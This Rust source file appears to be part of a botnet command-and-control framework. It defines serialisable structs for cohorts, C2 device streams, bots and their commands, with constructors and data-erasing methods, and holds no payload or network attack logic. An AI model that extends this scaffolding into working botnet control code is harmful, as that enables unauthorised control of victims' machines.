extern crate core;
use tokio::{
    net::{TcpListener, TcpStream},
};
use std::{
    net::SocketAddr,
};
use serde::{Deserialize, Serialize};
use rmp_serde::{Deserializer, Serializer};

use crate::communication::lib;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Cohort {
    pub authenticated: bool,
    pub connected: bool,
    pub encryption_key: Vec<u8>,
    pub hq_id: Vec<u8>,
    pub is_hq: bool,
    pub C2_Stream: Vec<self::Device_stream>,
}
impl Cohort {
    pub fn new() -> Cohort {
        Cohort {
            authenticated: false,
            connected: false,
            encryption_key: vec![],
            hq_id: lib::generate_uid(),
            is_hq: false,
            C2_Stream: Vec::new(),
        }
    }
    pub fn append_C2_Stream(&mut self, C2_Stream: self::Device_stream) {
        self.C2_Stream.push(C2_Stream);
    }
    pub fn promot_to_hq(&mut self) {
        self.is_hq = true;
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Device_stream {
    pub ip_address: std::net::SocketAddr,
    pub authenticated: bool,
    pub connected: bool,
    pub encryption_key: Vec<u8>,
    pub c2_id: Vec<u8>,
    pub B: self::Bot,
}
impl Device_stream {
    pub fn new(
        address: SocketAddr,
        authenticated: bool,
        connected: bool,
        encryption_key: Vec<u8>,
        B: Bot,
    ) -> Device_stream {
        Device_stream {
            ip_address: address,
            authenticated: false,
            connected: true,
            encryption_key: vec![],
            c2_id: lib::generate_uid(),
            B: B,
        }
    }
    pub fn erase_data(&mut self) {
        //self.sock.shutdown(Shutdown::Both).unwrap();
        self.B.erase_data();
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Bot {
    #[serde(with = "serde_bytes")]
    pub uid: Vec<u8>,
    #[serde(with = "serde_bytes")]
    pub version: Vec<u8>,
    pub com: self::Commands
}
impl Bot {
    pub fn new(uid: Vec<u8>, version: Vec<u8>) -> Bot {
        Bot {
            uid: uid,
            version: version,
            com: Commands::new(Vec::new(), Vec::new())
        }
    }
    pub fn erase_data(&mut self) {
        self.com.erase_data();
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Commands {
    #[serde(with = "serde_bytes")]
    pub command: Vec<u8>,
    #[serde(with = "serde_bytes")]
    pub data: Vec<u8>,
}
impl Commands {
    pub fn new(command: Vec<u8>, data: Vec<u8>) -> Commands {
        Commands {
            command: command,
            data: data,
        }
    }
    pub fn erase_data(&mut self) {
        self.command.clear();
        self.data.clear();
    }
}
